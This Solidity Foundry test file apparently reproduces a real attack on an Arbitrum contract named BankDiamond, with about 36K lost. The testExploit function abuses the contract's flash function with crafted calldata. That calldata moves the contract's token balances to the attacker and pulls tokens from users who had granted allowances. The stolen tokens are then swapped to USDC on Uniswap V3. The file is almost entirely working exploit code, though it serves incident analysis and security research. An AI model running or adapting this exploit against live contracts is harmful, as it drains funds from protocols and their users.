// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 36K
// Attacker : https://arbiscan.io/address/0xc91cb089084f0126458a1938b794aa73b9f9189d
// Attack Contract : https://arbiscan.io/address/0x68d843d31de072390d41bff30b0076bef0482d8f
// Vulnerable Contract : https://arbiscan.io/address/0x598c6c1cd9459f882530fc9d7da438cb74c6cb3b
// Attack Tx : https://arbiscan.io/tx/0x5d2a94785d95a740ec5f778e79ff014c880bcefec70d1a7c2440e611f84713d6

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x598c6c1cd9459f882530fc9d7da438cb74c6cb3b#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://twitter.com/0xlouistsai/status/1781845191047164016
// Hacking God :

interface IBankDiamond {
    function flash(address, bytes calldata) external returns (bytes memory result);
}

contract Rico is Test {
    uint256 blocknumToForkFrom = 202_973_712;

    address constant BankDiamond = 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b;
    address constant UniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address constant USDC_TOKEN = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_TOKEN = 0x912CE59144191C1204E64559FE8253a0e49E6548;
    address constant LINK_TOKEN = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
    address constant WSTETH_TOKEN = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant WETH_TOKEN = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant ARB_USDC_TOEKN = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker USDC Balance Before exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
        );

        // Transfer tokens from BankDiamond to the attacker
        transferTokens(USDC_TOKEN);
        transferTokens(ARB_TOKEN);
        transferTokens(LINK_TOKEN);
        transferTokens(WSTETH_TOKEN);
        transferTokens(WETH_TOKEN);
        transferTokens(ARB_USDC_TOEKN);

        // TransferFrom tokens from owners to the attacker
        transferFromOwner(0x512E07A093aAA20Ba288392EaDF03838C7a4e522, USDC_TOKEN);
        transferFromOwner(0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, USDC_TOKEN);
        transferFromOwner(0x7b782A4D552a8ceB3924005a786a1a358BA63f71, WSTETH_TOKEN);

        // Swap tokens to USDC using UniV3Router
        swapTokens(ARB_TOKEN);
        swapTokens(LINK_TOKEN);
        swapTokens(WSTETH_TOKEN);
        swapTokens(WETH_TOKEN);
        swapTokens(ARB_USDC_TOEKN);

        // Log balances after exploit
        emit log_named_decimal_uint(
            "Attacker USDC Balance After exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
        );
    }

    function _getTransferData(address token) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), tokenBalance);
    }

    function _getTransferFromData(address token, address user) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        uint256 tokenAllowance = IERC20(token).allowance(user, BankDiamond);
        if (tokenBalance >= tokenAllowance) {
            data = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), tokenBalance);
        }
    }

    function transferTokens(address token) internal {
        IBankDiamond(BankDiamond).flash(token, _getTransferData(token));
    }

    function transferFromOwner(address owner, address token) internal {
        bytes memory callData = _getTransferFromData(token, owner);
        if (callData.length > 0) {
            IBankDiamond(BankDiamond).flash(token, callData);
        }
    }

    function swapTokens(address token) internal {
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(UniV3Router, tokenBalance);

        Uni_Router_V3.ExactInputSingleParams memory params;
        params.tokenIn = token;
        params.tokenOut = USDC_TOKEN;
        params.fee = 3000;
        params.recipient = address(this);
        params.deadline = block.timestamp;
        params.amountIn = tokenBalance;
        params.amountOutMinimum = 0;
        params.sqrtPriceLimitX96 = 0;
        Uni_Router_V3(UniV3Router).exactInputSingle(params);
    }
}
